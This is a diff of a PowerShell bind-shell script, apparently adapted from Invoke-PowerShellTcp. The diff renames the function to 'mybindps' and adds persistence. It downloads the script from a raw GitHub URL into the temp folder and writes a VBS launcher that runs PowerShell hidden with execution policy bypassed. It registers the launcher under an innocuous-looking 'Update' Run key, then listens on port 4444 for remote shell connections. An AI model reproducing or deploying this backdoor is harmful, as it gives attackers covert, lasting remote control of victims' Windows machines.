@@ -1,6 +1,6 @@
-function Invoke-PowerShellTcp 
+function mybindps 
 { 
-    ##
+    
 	Param ( 
         [int]
         $Port
@@ -9,7 +9,7 @@ function Invoke-PowerShellTcp
     try 
     {
 	
-			$code = {
+		$code = {
 				param(
 				[System.Net.Sockets.TcpClient]$client
 				)
@@ -58,7 +58,20 @@ function Invoke-PowerShellTcp
 		}#code
 	
 	
+	#enable auto  run 
+				 $name = "persist.vbs"         
+				#Out-File -InputObject $all -Force $env:TEMP\$modulename    
+				$modulename = $script:MyInvocation.MyCommand.Name
+				 $webclient = New-Object System.Net.WebClient
+				$file = "$env:temp\$modulename"
+				$webclient.DownloadFile("https://raw.githubusercontent.com/xingkong123600/TT/master/mybindps.ps1","$file")
+			
+				New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
+				echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
+				echo "objShell.run(`"powershell -noexit -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
        
+	 #enable auto run 
+	   
             $listener = [System.Net.Sockets.TcpListener]$Port
 			#$listener = New-Object System.Net.Sockets.TcpListener($Port)
             $listener.start()    
@@ -84,8 +97,8 @@ function Invoke-PowerShellTcp
 		
     }
 }
+mybindps(4444)
 
-Invoke-PowerShellTcp(4444)
 
 
 
